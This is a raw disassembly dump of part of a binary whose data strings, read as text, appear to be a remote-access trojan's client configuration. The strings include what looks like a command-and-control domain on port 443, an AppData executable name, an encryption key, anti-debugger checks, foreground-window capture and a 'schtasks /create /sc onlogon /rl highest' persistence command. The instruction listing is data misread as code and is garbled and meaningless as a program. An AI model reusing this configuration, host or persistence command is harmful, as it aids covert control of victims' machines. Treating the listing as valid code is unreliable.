  406efe:	6e                   	outsb  %ds:(%esi),(%dx)
  406eff:	76 61                	jbe    0x406f62
  406f01:	72 69                	jb     0x406f6c
  406f03:	61                   	popa
  406f04:	6e                   	outsb  %ds:(%esi),(%dx)
  406f05:	74 00                	je     0x406f07
  406f07:	57                   	push   %edi
  406f08:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  406f0c:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  406f13:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  406f1a:	65 
  406f1b:	43                   	inc    %ebx
  406f1c:	6c                   	insb   (%dx),%es:(%edi)
  406f1d:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  406f24:	74 5f                	je     0x406f85
  406f26:	53                   	push   %ebx
  406f27:	73 6c                	jae    0x406f95
  406f29:	43                   	inc    %ebx
  406f2a:	6c                   	insb   (%dx),%es:(%edi)
  406f2b:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  406f32:	74 5f                	je     0x406f93
  406f34:	53                   	push   %ebx
  406f35:	73 6c                	jae    0x406fa3
  406f37:	43                   	inc    %ebx
  406f38:	6c                   	insb   (%dx),%es:(%edi)
  406f39:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  406f40:	74 5f                	je     0x406fa1
  406f42:	54                   	push   %esp
  406f43:	63 70 43             	arpl   %esi,0x43(%eax)
  406f46:	6c                   	insb   (%dx),%es:(%edi)
  406f47:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  406f4e:	74 5f                	je     0x406faf
  406f50:	54                   	push   %esp
  406f51:	63 70 43             	arpl   %esi,0x43(%eax)
  406f54:	6c                   	insb   (%dx),%es:(%edi)
  406f55:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  406f5c:	74 68                	je     0x406fc6
  406f5e:	65 6e                	outsb  %gs:(%esi),(%dx)
  406f60:	74 69                	je     0x406fcb
  406f62:	63 61 74             	arpl   %esp,0x74(%ecx)
  406f65:	65 41                	gs inc %ecx
  406f67:	73 43                	jae    0x406fac
  406f69:	6c                   	insb   (%dx),%es:(%edi)
  406f6a:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  406f71:	73 74                	jae    0x406fe7
  406f73:	65 6d                	gs insl (%dx),%es:(%edi)
  406f75:	2e 4d                	cs dec %ebp
  406f77:	61                   	popa
  406f78:	6e                   	outsb  %ds:(%esi),(%dx)
  406f79:	61                   	popa
  406f7a:	67 65 6d             	gs insl (%dx),%es:(%di)
  406f7d:	65 6e                	outsb  %gs:(%esi),(%dx)
  406f7f:	74 00                	je     0x406f81
  406f81:	45                   	inc    %ebp
  406f82:	6e                   	outsb  %ds:(%esi),(%dx)
  406f83:	76 69                	jbe    0x406fee
  406f85:	72 6f                	jb     0x406ff6
  406f87:	6e                   	outsb  %ds:(%esi),(%dx)
  406f88:	6d                   	insl   (%dx),%es:(%edi)
  406f89:	65 6e                	outsb  %gs:(%esi),(%dx)
  406f8b:	74 00                	je     0x406f8d
  406f8d:	67 65 74 5f          	addr16 gs je 0x406ff0
  406f91:	43                   	inc    %ebx
  406f92:	75 72                	jne    0x407006
  406f94:	72 65                	jb     0x406ffb
  406f96:	6e                   	outsb  %ds:(%esi),(%dx)
  406f97:	74 00                	je     0x406f99
  406f99:	47                   	inc    %edi
  406f9a:	65 74 43             	gs je  0x406fe0
  406f9d:	75 72                	jne    0x407011
  406f9f:	72 65                	jb     0x407006
  406fa1:	6e                   	outsb  %ds:(%esi),(%dx)
  406fa2:	74 00                	je     0x406fa4
  406fa4:	43                   	inc    %ebx
  406fa5:	68 65 63 6b 52       	push   $0x526b6365
  406faa:	65 6d                	gs insl (%dx),%es:(%edi)
  406fac:	6f                   	outsl  %ds:(%esi),(%dx)
  406fad:	74 65                	je     0x407014
  406faf:	44                   	inc    %esp
  406fb0:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  406fb4:	67 65 72 50          	addr16 gs jb 0x407008
  406fb8:	72 65                	jb     0x40701f
  406fba:	73 65                	jae    0x407021
  406fbc:	6e                   	outsb  %ds:(%esi),(%dx)
  406fbd:	74 00                	je     0x406fbf
  406fbf:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  406fc6:	67 65 72 50          	addr16 gs jb 0x40701a
  406fca:	72 65                	jb     0x407031
  406fcc:	73 65                	jae    0x407033
  406fce:	6e                   	outsb  %ds:(%esi),(%dx)
  406fcf:	74 00                	je     0x406fd1
  406fd1:	67 65 74 5f          	addr16 gs je 0x407034
  406fd5:	52                   	push   %edx
  406fd6:	65 6d                	gs insl (%dx),%es:(%edi)
  406fd8:	6f                   	outsl  %ds:(%esi),(%dx)
  406fd9:	74 65                	je     0x407040
  406fdb:	45                   	inc    %ebp
  406fdc:	6e                   	outsb  %ds:(%esi),(%dx)
  406fdd:	64 50                	fs push %eax
  406fdf:	6f                   	outsl  %ds:(%esi),(%dx)
  406fe0:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  406fe7:	5f                   	pop    %edi
  406fe8:	43                   	inc    %ebx
  406fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  406fea:	75 6e                	jne    0x40705a
  406fec:	74 00                	je     0x406fee
  406fee:	67 65 74 5f          	addr16 gs je 0x407051
  406ff2:	50                   	push   %eax
  406ff3:	72 6f                	jb     0x407064
  406ff5:	63 65 73             	arpl   %esp,0x73(%ebp)
  406ff8:	73 6f                	jae    0x407069
  406ffa:	72 43                	jb     0x40703f
  406ffc:	6f                   	outsl  %ds:(%esi),(%dx)
  406ffd:	75 6e                	jne    0x40706d
  406fff:	74 00                	je     0x407001
  407001:	63 6f 75             	arpl   %ebp,0x75(%edi)
  407004:	6e                   	outsb  %ds:(%esi),(%dx)
  407005:	74 00                	je     0x407007
  407007:	47                   	inc    %edi
  407008:	65 74 50             	gs je  0x40705b
  40700b:	61                   	popa
  40700c:	74 68                	je     0x407076
  40700e:	52                   	push   %edx
  40700f:	6f                   	outsl  %ds:(%esi),(%dx)
  407010:	6f                   	outsl  %ds:(%esi),(%dx)
  407011:	74 00                	je     0x407013
  407013:	44                   	inc    %esp
  407014:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  407018:	70 74                	jo     0x40708e
  40701a:	00 45 6e             	add    %al,0x6e(%ebp)
  40701d:	63 72 79             	arpl   %esi,0x79(%edx)
  407020:	70 74                	jo     0x407096
  407022:	00 50 61             	add    %dl,0x61(%eax)
  407025:	72 61                	jb     0x407088
  407027:	6d                   	insl   (%dx),%es:(%edi)
  407028:	65 74 65             	gs je  0x407090
  40702b:	72 69                	jb     0x407096
  40702d:	7a 65                	jp     0x407094
  40702f:	64 54                	fs push %esp
  407031:	68 72 65 61 64       	push   $0x64616572
  407036:	53                   	push   %ebx
  407037:	74 61                	je     0x40709a
  407039:	72 74                	jb     0x4070af
  40703b:	00 43 6f             	add    %al,0x6f(%ebx)
  40703e:	6e                   	outsb  %ds:(%esi),(%dx)
  40703f:	76 65                	jbe    0x4070a6
  407041:	72 74                	jb     0x4070b7
  407043:	00 46 61             	add    %al,0x61(%esi)
  407046:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  40704d:	54 
  40704e:	6f                   	outsl  %ds:(%esi),(%dx)
  40704f:	4c                   	dec    %esp
  407050:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  407057:	75 74                	jne    0x4070cd
  407059:	00 4d 6f             	add    %cl,0x6f(%ebp)
  40705c:	76 65                	jbe    0x4070c3
  40705e:	4e                   	dec    %esi
  40705f:	65 78 74             	gs js  0x4070d6
  407062:	00 53 79             	add    %dl,0x79(%ebx)
  407065:	73 74                	jae    0x4070db
  407067:	65 6d                	gs insl (%dx),%es:(%edi)
  407069:	2e 54                	cs push %esp
  40706b:	65 78 74             	gs js  0x4070e2
  40706e:	00 47 65             	add    %al,0x65(%edi)
  407071:	74 57                	je     0x4070ca
  407073:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  40707a:	78 74                	js     0x4070f0
  40707c:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  407080:	74 00                	je     0x407082
  407082:	47                   	inc    %edi
  407083:	65 74 46             	gs je  0x4070cc
  407086:	6f                   	outsl  %ds:(%esi),(%dx)
  407087:	72 65                	jb     0x4070ee
  407089:	67 72 6f             	addr16 jb 0x4070fb
  40708c:	75 6e                	jne    0x4070fc
  40708e:	64 57                	fs push %edi
  407090:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  407097:	65 74 5f             	gs je  0x4070f9
  40709a:	43                   	inc    %ebx
  40709b:	72 65                	jb     0x407102
  40709d:	61                   	popa
  40709e:	74 65                	je     0x407105
  4070a0:	4e                   	dec    %esi
  4070a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4070a2:	57                   	push   %edi
  4070a3:	69 6e 64 6f 77 00 43 	imul   $0x4300776f,0x64(%esi),%ebp
  4070aa:	6c                   	insb   (%dx),%es:(%edi)
  4070ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4070ac:	73 65                	jae    0x407113
  4070ae:	4d                   	dec    %ebp
  4070af:	75 74                	jne    0x407125
  4070b1:	65 78 00             	gs js  0x4070b4
  4070b4:	43                   	inc    %ebx
  4070b5:	72 65                	jb     0x40711c
  4070b7:	61                   	popa
  4070b8:	74 65                	je     0x40711f
  4070ba:	4d                   	dec    %ebp
  4070bb:	75 74                	jne    0x407131
  4070bd:	65 78 00             	gs js  0x4070c0
  4070c0:	44                   	inc    %esp
  4070c1:	65 6c                	gs insb (%dx),%es:(%edi)
  4070c3:	61                   	popa
  4070c4:	79 00                	jns    0x4070c6
  4070c6:	49                   	dec    %ecx
  4070c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4070c8:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  4070cf:	65 
  4070d0:	41                   	inc    %ecx
  4070d1:	72 72                	jb     0x407145
  4070d3:	61                   	popa
  4070d4:	79 00                	jns    0x4070d6
  4070d6:	54                   	push   %esp
  4070d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4070d8:	41                   	inc    %ecx
  4070d9:	72 72                	jb     0x40714d
  4070db:	61                   	popa
  4070dc:	79 00                	jns    0x4070de
  4070de:	67 65 74 5f          	addr16 gs je 0x407141
  4070e2:	4b                   	dec    %ebx
  4070e3:	65 79 00             	gs jns 0x4070e6
  4070e6:	73 65                	jae    0x40714d
  4070e8:	74 5f                	je     0x407149
  4070ea:	4b                   	dec    %ebx
  4070eb:	65 79 00             	gs jns 0x4070ee
  4070ee:	43                   	inc    %ebx
  4070ef:	72 65                	jb     0x407156
  4070f1:	61                   	popa
  4070f2:	74 65                	je     0x407159
  4070f4:	53                   	push   %ebx
  4070f5:	75 62                	jne    0x407159
  4070f7:	4b                   	dec    %ebx
  4070f8:	65 79 00             	gs jns 0x4070fb
  4070fb:	44                   	inc    %esp
  4070fc:	65 6c                	gs insb (%dx),%es:(%edi)
  4070fe:	65 74 65             	gs je  0x407166
  407101:	53                   	push   %ebx
  407102:	75 62                	jne    0x407166
  407104:	4b                   	dec    %ebx
  407105:	65 79 00             	gs jns 0x407108
  407108:	4f                   	dec    %edi
  407109:	70 65                	jo     0x407170
  40710b:	6e                   	outsb  %ds:(%esi),(%dx)
  40710c:	53                   	push   %ebx
  40710d:	75 62                	jne    0x407171
  40710f:	4b                   	dec    %ebx
  407110:	65 79 00             	gs jns 0x407113
  407113:	67 65 74 5f          	addr16 gs je 0x407176
  407117:	50                   	push   %eax
  407118:	75 62                	jne    0x40717c
  40711a:	6c                   	insb   (%dx),%es:(%edi)
  40711b:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  407122:	61                   	popa
  407123:	75 74                	jne    0x407199
  407125:	68 4b 65 79 00       	push   $0x79654b
  40712a:	6d                   	insl   (%dx),%es:(%edi)
  40712b:	61                   	popa
  40712c:	73 74                	jae    0x4071a2
  40712e:	65 72 4b             	gs jb  0x40717c
  407131:	65 79 00             	gs jns 0x407134
  407134:	52                   	push   %edx
  407135:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40713c:	4b 65 
  40713e:	79 00                	jns    0x407140
  407140:	5f                   	pop    %edi
  407141:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  407145:	53                   	push   %ebx
  407146:	79 73                	jns    0x4071bb
  407148:	74 65                	je     0x4071af
  40714a:	6d                   	insl   (%dx),%es:(%edi)
  40714b:	2e 53                	cs push %ebx
  40714d:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407151:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  407158:	70 
  407159:	74 6f                	je     0x4071ca
  40715b:	67 72 61             	addr16 jb 0x4071bf
  40715e:	70 68                	jo     0x4071c8
  407160:	79 00                	jns    0x407162
  407162:	41                   	inc    %ecx
  407163:	73 73                	jae    0x4071d8
  407165:	65 6d                	gs insl (%dx),%es:(%edi)
  407167:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40716b:	41                   	inc    %ecx
  40716c:	64 64 72 65          	fs fs jb 0x4071d5
  407170:	73 73                	jae    0x4071e5
  407172:	46                   	inc    %esi
  407173:	61                   	popa
  407174:	6d                   	insl   (%dx),%es:(%edi)
  407175:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  40717c:	63 
  40717d:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  407181:	79 00                	jns    0x407183
  407183:	67 65 74 5f          	addr16 gs je 0x4071e6
  407187:	53                   	push   %ebx
  407188:	79 73                	jns    0x4071fd
  40718a:	74 65                	je     0x4071f1
  40718c:	6d                   	insl   (%dx),%es:(%edi)
  40718d:	44                   	inc    %esp
  40718e:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  407195:	79 00                	jns    0x407197
  407197:	53                   	push   %ebx
  407198:	65 74 52             	gs je  0x4071ed
  40719b:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  4071a2:	00 6f 
  4071a4:	70 5f                	jo     0x407205
  4071a6:	45                   	inc    %ebp
  4071a7:	71 75                	jno    0x40721e
  4071a9:	61                   	popa
  4071aa:	6c                   	insb   (%dx),%es:(%edi)
  4071ab:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  4071b2:	49 
  4071b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4071b4:	65 71 75             	gs jno 0x40722c
  4071b7:	61                   	popa
  4071b8:	6c                   	insb   (%dx),%es:(%edi)
  4071b9:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4071c0:	74 
  4071c1:	65 6d                	gs insl (%dx),%es:(%edi)
  4071c3:	2e 4e                	cs dec %esi
  4071c5:	65 74 2e             	gs je  0x4071f6
  4071c8:	53                   	push   %ebx
  4071c9:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4071cd:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4071d4:	64 
  4071d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4071d6:	77 73                	ja     0x40724b
  4071d8:	49                   	dec    %ecx
  4071d9:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4071dc:	74 69                	je     0x407247
  4071de:	74 79                	je     0x407259
  4071e0:	00 49 73             	add    %cl,0x73(%ecx)
  4071e3:	4e                   	dec    %esi
  4071e4:	75 6c                	jne    0x407252
  4071e6:	6c                   	insb   (%dx),%es:(%edi)
  4071e7:	4f                   	dec    %edi
  4071e8:	72 45                	jb     0x40722f
  4071ea:	6d                   	insl   (%dx),%es:(%edi)
  4071eb:	70 74                	jo     0x407261
  4071ed:	79 00                	jns    0x4071ef
  4071ef:	00 00                	add    %al,(%eax)
  4071f1:	0d 53 00 48 00       	or     $0x480053,%eax
  4071f6:	41                   	inc    %ecx
  4071f7:	00 32                	add    %dh,(%edx)
  4071f9:	00 35 00 36 00 00    	add    %dh,0x3600
  4071ff:	07                   	pop    %es
  407200:	34 00                	xor    $0x0,%al
  407202:	34 00                	xor    $0x0,%al
  407204:	33 00                	xor    (%eax),%eax
  407206:	00 41 63             	add    %al,0x63(%ecx)
  407209:	00 6f 00             	add    %ch,0x0(%edi)
  40720c:	61                   	popa
  40720d:	00 63 00             	add    %ah,0x0(%ebx)
  407210:	68 00 2d 00 66       	push   $0x66002d00
  407215:	00 61 00             	add    %ah,0x0(%ecx)
  407218:	63 00                	arpl   %eax,(%eax)
  40721a:	74 00                	je     0x40721c
  40721c:	6f                   	outsl  %ds:(%esi),(%dx)
  40721d:	00 72 00             	add    %dh,0x0(%edx)
  407220:	79 00                	jns    0x407222
  407222:	6f                   	outsl  %ds:(%esi),(%dx)
  407223:	00 75 00             	add    %dh,0x0(%ebp)
  407226:	74 00                	je     0x407228
  407228:	6c                   	insb   (%dx),%es:(%edi)
  407229:	00 65 00             	add    %ah,0x0(%ebp)
  40722c:	74 00                	je     0x40722e
  40722e:	6f                   	outsl  %ds:(%esi),(%dx)
  40722f:	00 6e 00             	add    %ch,0x0(%esi)
  407232:	6c                   	insb   (%dx),%es:(%edi)
  407233:	00 69 00             	add    %ch,0x0(%ecx)
  407236:	6e                   	outsb  %ds:(%esi),(%dx)
  407237:	00 65 00             	add    %ah,0x0(%ebp)
  40723a:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40723e:	6f                   	outsl  %ds:(%esi),(%dx)
  40723f:	00 6d 00             	add    %ch,0x0(%ebp)
  407242:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  407246:	6f                   	outsl  %ds:(%esi),(%dx)
  407247:	00 01                	add    %al,(%ecx)
  407249:	0d 30 00 2e 00       	or     $0x2e0030,%eax
  40724e:	35 00 2e 00 37       	xor    $0x37002e00,%eax
  407253:	00 42 00             	add    %al,0x0(%edx)
  407256:	00 0b                	add    %cl,(%ebx)
  407258:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40725c:	6c                   	insb   (%dx),%es:(%edi)
  40725d:	00 73 00             	add    %dh,0x0(%ebx)
  407260:	65 00 00             	add    %al,%gs:(%eax)
  407263:	0f 41 00             	cmovno (%eax),%eax
  407266:	70 00                	jo     0x407268
  407268:	70 00                	jo     0x40726a
  40726a:	44                   	inc    %esp
  40726b:	00 61 00             	add    %ah,0x0(%ecx)
  40726e:	74 00                	je     0x407270
  407270:	61                   	popa
  407271:	00 00                	add    %al,(%eax)
  407273:	17                   	pop    %ss
  407274:	61                   	popa
  407275:	00 75 00             	add    %dh,0x0(%ebp)
  407278:	38 00                	cmp    %al,(%eax)
  40727a:	38 00                	cmp    %al,(%eax)
  40727c:	61                   	popa
  40727d:	00 70 00             	add    %dh,0x0(%eax)
  407280:	70 00                	jo     0x407282
  407282:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  407286:	78 00                	js     0x407288
  407288:	65 00 00             	add    %al,%gs:(%eax)
  40728b:	59                   	pop    %ecx
  40728c:	55                   	push   %ebp
  40728d:	00 32                	add    %dh,(%edx)
  40728f:	00 56 00             	add    %dl,0x0(%esi)
  407292:	6a 00                	push   $0x0
  407294:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  407298:	4a                   	dec    %edx
  407299:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40729d:	00 6d 00             	add    %ch,0x0(%ebp)
  4072a0:	46                   	inc    %esi
  4072a1:	00 75 00             	add    %dh,0x0(%ebp)
  4072a4:	5a                   	pop    %edx
  4072a5:	00 47 00             	add    %al,0x0(%edi)
  4072a8:	39 00                	cmp    %eax,(%eax)
  4072aa:	74 00                	je     0x4072ac
  4072ac:	53                   	push   %ebx
  4072ad:	00 32                	add    %dh,(%edx)
  4072af:	00 56 00             	add    %dl,0x0(%esi)
  4072b2:	35 00 52 00 6d       	xor    $0x6d005200,%eax
  4072b7:	00 39                	add    %bh,(%ecx)
  4072b9:	00 79 00             	add    %bh,0x0(%ecx)
  4072bc:	55                   	push   %ebp
  4072bd:	00 6d 00             	add    %ch,0x0(%ebp)
  4072c0:	46                   	inc    %esi
  4072c1:	00 30                	add    %dh,(%eax)
  4072c3:	00 4d 00             	add    %cl,0x0(%ebp)
  4072c6:	6a 00                	push   $0x0
  4072c8:	41                   	inc    %ecx
  4072c9:	00 79 00             	add    %bh,0x0(%ecx)
  4072cc:	4e                   	dec    %esi
  4072cd:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  4072d1:	00 79 00             	add    %bh,0x0(%ecx)
  4072d4:	62 00                	bound  %eax,(%eax)
  4072d6:	32 00                	xor    (%eax),%al
  4072d8:	70 00                	jo     0x4072da
  4072da:	6c                   	insb   (%dx),%es:(%edi)
  4072db:	00 59 00             	add    %bl,0x0(%ecx)
  4072de:	33 00                	xor    (%eax),%eax
  4072e0:	51                   	push   %ecx
  4072e1:	00 3d 00 00 0b 25    	add    %bh,0x250b0000
  4072e7:	00 4d 00             	add    %cl,0x0(%ebp)
  4072ea:	54                   	push   %esp
  4072eb:	00 58 00             	add    %bl,0x0(%eax)
  4072ee:	25 00 00 1b 25       	and    $0x251b0000,%eax
  4072f3:	00 43 00             	add    %al,0x0(%ebx)
  4072f6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4072fa:	74 00                	je     0x4072fc
  4072fc:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  407302:	63 00                	arpl   %eax,(%eax)
  407304:	61                   	popa
  407305:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  407309:	00 25 00 00 23 25    	add    %ah,0x25230000
  40730f:	00 53 00             	add    %dl,0x0(%ebx)
  407312:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407316:	76 00                	jbe    0x407318
  407318:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40731c:	73 00                	jae    0x40731e
  40731e:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  407324:	61                   	popa
  407325:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  407329:	00 72 00             	add    %dh,0x0(%edx)
  40732c:	65 00 25 00 00 09 6e 	add    %ah,%gs:0x6e090000
  407333:	00 75 00             	add    %dh,0x0(%ebp)
  407336:	6c                   	insb   (%dx),%es:(%edi)
  407337:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40733b:	03 30                	add    (%eax),%esi
  40733d:	00 00                	add    %al,(%eax)
  40733f:	0b 44 00 65          	or     0x65(%eax,%eax,1),%eax
  407343:	00 62 00             	add    %ah,0x0(%edx)
  407346:	75 00                	jne    0x407348
  407348:	67 00 00             	add    %al,(%bx,%si)
  40734b:	01 00                	add    %eax,(%eax)
  40734d:	03 3a                	add    (%edx),%edi
  40734f:	00 00                	add    %al,(%eax)
  407351:	15 43 00 6f 00       	adc    $0x6f0043,%eax
  407356:	6e                   	outsb  %ds:(%esi),(%dx)
  407357:	00 6e 00             	add    %ch,0x0(%esi)
  40735a:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40735e:	74 00                	je     0x407360
  407360:	65 00 64 00 21       	add    %ah,%gs:0x21(%eax,%eax,1)
  407365:	00 00                	add    %al,(%eax)
  407367:	1b 44 00 69          	sbb    0x69(%eax,%eax,1),%eax
  40736b:	00 73 00             	add    %dh,0x0(%ebx)
  40736e:	63 00                	arpl   %eax,(%eax)
  407370:	6f                   	outsl  %ds:(%esi),(%dx)
  407371:	00 6e 00             	add    %ch,0x0(%esi)
  407374:	6e                   	outsb  %ds:(%esi),(%dx)
  407375:	00 65 00             	add    %ah,0x0(%ebp)
  407378:	63 00                	arpl   %eax,(%eax)
  40737a:	74 00                	je     0x40737c
  40737c:	65 00 64 00 21       	add    %ah,%gs:0x21(%eax,%eax,1)
  407381:	00 00                	add    %al,(%eax)
  407383:	2d 2f 00 2f 00       	sub    $0x2f002f,%eax
  407388:	2f                   	das
  407389:	00 20                	add    %ah,(%eax)
  40738b:	00 43 00             	add    %al,0x0(%ebx)
  40738e:	6c                   	insb   (%dx),%es:(%edi)
  40738f:	00 69 00             	add    %ch,0x0(%ecx)
  407392:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407396:	74 00                	je     0x407398
  407398:	20 00                	and    %al,(%eax)
  40739a:	42                   	inc    %edx
  40739b:	00 75 00             	add    %dh,0x0(%ebp)
  40739e:	66 00 66 00          	data16 add %ah,0x0(%esi)
  4073a2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4073a6:	73 00                	jae    0x4073a8
  4073a8:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  4073ae:	20 00                	and    %al,(%eax)
  4073b0:	00 17                	add    %dl,(%edi)
  4073b2:	20 00                	and    %al,(%eax)
  4073b4:	42                   	inc    %edx
  4073b5:	00 79 00             	add    %bh,0x0(%ecx)
  4073b8:	74 00                	je     0x4073ba
  4073ba:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4073be:	20 00                	and    %al,(%eax)
  4073c0:	20 00                	and    %al,(%eax)
  4073c2:	2f                   	das
  4073c3:	00 2f                	add    %ch,(%edi)
  4073c5:	00 2f                	add    %ch,(%edi)
  4073c7:	00 00                	add    %al,(%eax)
  4073c9:	17                   	pop    %ss
  4073ca:	73 00                	jae    0x4073cc
  4073cc:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4073d0:	64 00 20             	add    %ah,%fs:(%eax)
  4073d3:	00 63 00             	add    %ah,0x0(%ebx)
  4073d6:	68 00 75 00 6e       	push   $0x6e007500
  4073db:	00 6b 00             	add    %ch,0x0(%ebx)
  4073de:	73 00                	jae    0x4073e0
  4073e0:	00 0d 50 00 61 00    	add    %cl,0x610050
  4073e6:	63 00                	arpl   %eax,(%eax)
  4073e8:	6b 00 65             	imul   $0x65,(%eax),%eax
  4073eb:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4073ef:	09 50 00             	or     %edx,0x0(%eax)
  4073f2:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4073f8:	00 0f                	add    %cl,(%edi)
  4073fa:	4d                   	dec    %ebp
  4073fb:	00 65 00             	add    %ah,0x0(%ebp)
  4073fe:	73 00                	jae    0x407400
  407400:	73 00                	jae    0x407402
  407402:	61                   	popa
  407403:	00 67 00             	add    %ah,0x0(%edi)
  407406:	65 00 00             	add    %al,%gs:(%eax)
  407409:	1b 52 00             	sbb    0x0(%edx),%edx
  40740c:	61                   	popa
  40740d:	00 6e 00             	add    %ch,0x0(%esi)
  407410:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  407414:	6d                   	insl   (%dx),%es:(%edi)
  407415:	00 50 00             	add    %dl,0x0(%eax)
  407418:	61                   	popa
  407419:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40741d:	00 69 00             	add    %ch,0x0(%ecx)
  407420:	6e                   	outsb  %ds:(%esi),(%dx)
  407421:	00 67 00             	add    %ah,0x0(%edi)
  407424:	00 07                	add    %al,(%edi)
  407426:	63 00                	arpl   %eax,(%eax)
  407428:	6d                   	insl   (%dx),%es:(%edi)
  407429:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40742d:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  407433:	00 73 00             	add    %dh,0x0(%ebx)
  407436:	63 00                	arpl   %eax,(%eax)
  407438:	68 00 74 00 61       	push   $0x61007400
  40743d:	00 73 00             	add    %dh,0x0(%ebx)
  407440:	6b 00 73             	imul   $0x73,(%eax),%eax
  407443:	00 20                	add    %ah,(%eax)
  407445:	00 2f                	add    %ch,(%edi)
  407447:	00 63 00             	add    %ah,0x0(%ebx)
  40744a:	72 00                	jb     0x40744c
  40744c:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407450:	74 00                	je     0x407452
  407452:	65 00 20             	add    %ah,%gs:(%eax)
  407455:	00 2f                	add    %ch,(%edi)
  407457:	00 66 00             	add    %ah,0x0(%esi)
  40745a:	20 00                	and    %al,(%eax)
  40745c:	2f                   	das
  40745d:	00 73 00             	add    %dh,0x0(%ebx)
  407460:	63 00                	arpl   %eax,(%eax)
  407462:	20 00                	and    %al,(%eax)
  407464:	6f                   	outsl  %ds:(%esi),(%dx)
  407465:	00 6e 00             	add    %ch,0x0(%esi)
  407468:	6c                   	insb   (%dx),%es:(%edi)
  407469:	00 6f 00             	add    %ch,0x0(%edi)
  40746c:	67 00 6f 00          	add    %ch,0x0(%bx)
  407470:	6e                   	outsb  %ds:(%esi),(%dx)
  407471:	00 20                	add    %ah,(%eax)
  407473:	00 2f                	add    %ch,(%edi)
  407475:	00 72 00             	add    %dh,0x0(%edx)
  407478:	6c                   	insb   (%dx),%es:(%edi)
  407479:	00 20                	add    %ah,(%eax)
  40747b:	00 68 00             	add    %ch,0x0(%eax)
  40747e:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  407484:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407488:	74 00                	je     0x40748a
  40748a:	20 00                	and    %al,(%eax)
  40748c:	2f                   	das
  40748d:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  407491:	00 20                	add    %ah,(%eax)
  407493:	00 22                	add    %ah,(%edx)
